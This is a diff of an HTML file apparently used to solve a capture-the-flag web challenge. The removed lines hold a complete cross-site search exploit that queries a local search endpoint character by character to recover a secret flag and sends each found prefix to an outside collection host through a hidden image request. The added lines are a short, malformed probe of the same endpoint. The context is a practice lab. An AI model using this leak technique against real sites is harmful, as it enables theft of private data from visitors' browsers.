@@ -1,51 +1,5 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit</title>
-</head>
-<body>
-    <iframe id="iframe" style="display: none;"></iframe>
-    <img id="img" style="display: none;">
-
-    <script>
-        async function req(url) {
-            const response = await fetch(url);
-            return response.status === 200;
-        }
-
-        async function searchAndUpdate(query) {
-            const isFound = await req(`http://127.0.0.1:8000/search?keyword=${query}`);
-            if (isFound) {
-                img.src = `https://sqxbtet.request.dreamhack.games/${query}`;
-                return true;
-            }
-            return false;
-        }
-
-        async function exploit() {
-            let chars = "0123456789abcdef}"
-            let secret = "DH{";
-
-            // '}'가 발견될 때까지만 반복합니다.
-            while (!secret.includes("}")) {
-                let found = false;
-                for (let c of chars) {
-                    if (await searchAndUpdate(secret + c)) {
-                        secret += c;
-                        found = true;
-                        break;
-                    }
-                }
-                if (!found) {
-                    console.log("탐색 종료:", secret);
-                    break;
-                }
-            }
-        }
-
-        exploit();
-    </script>
-</body>
-</html>
+<script>
+    let a = document.createElement('img');
+    a.src = "<img src='http://127.0.0.1:8000/search?keyword='DH'>"
+    document.body.appendChild(a)
+</script>
